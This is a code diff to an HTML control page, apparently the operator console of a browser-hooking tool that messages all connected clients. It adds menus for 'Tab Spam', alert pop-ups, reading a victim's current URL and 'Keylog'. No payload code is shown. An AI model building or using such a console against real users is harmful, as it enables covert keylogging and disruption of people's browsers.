@@ -1,13 +1,37 @@
 <!DOCTYPE html>
 <html>
   <head>
+    <!--<meta name="viewport" content="width=device-width, initial-scale=1">-->
     <link rel="stylesheet" href="index.css">
+    <link rel="stylesheet" href="bootstrap.min.css">
+    <script src="jquery.min.js"></script>
     <script src="sha1.js"></script>
     <script src="http.js"></script>
     <script src="index.js"></script>
+    <script src="com.js"></script>
+    <script src="assign.js" defer></script>
+    <script src="bootstrap.min.js"></script> 
+     
   </head>
-  <body>
-    <textarea id="log"></textarea>
-    <input type="text" id="input" placeholder="Type a message to ALL connected clients here">
+  <body style="background-color: #3e3e5b;">
+      <div class="dropdown" style="color: #e0e0eb;background-color: #3e3e5b;display: inline;">
+    <button class="btn btn-primary dropdown-toggle" type="button" data-toggle="dropdown">Troll
+    <span class="caret"></span></button>
+    <ul class="dropdown-menu">
+      <li><a id="1">Tab Spam</a></li>
+      <li><a id="2">Alert Message</a></li>
+      <li><a id="3">Client Specific Alert</a></li>
+    </ul>
+  </div>
+      <div class="dropdown" style="color: #e0e0eb;background-color: #3e3e5b;display: inline;">
+    <button class="btn btn-primary dropdown-toggle" type="button" data-toggle="dropdown">Info
+    <span class="caret"></span></button>
+    <ul class="dropdown-menu">
+      <li><a id="4">Get window.location.href</a></li>
+      <li><a id="5">Keylog</a></li>  
+    </ul>
+  </div>
+      <textarea id="log" style="color: #e0e0eb;background-color: #3e3e5b;"></textarea>
+    <input style="color: #e0e0eb;background-color: #3e3e5b;" type="text" placeholder=">" id="input">
   </body>
 </html>
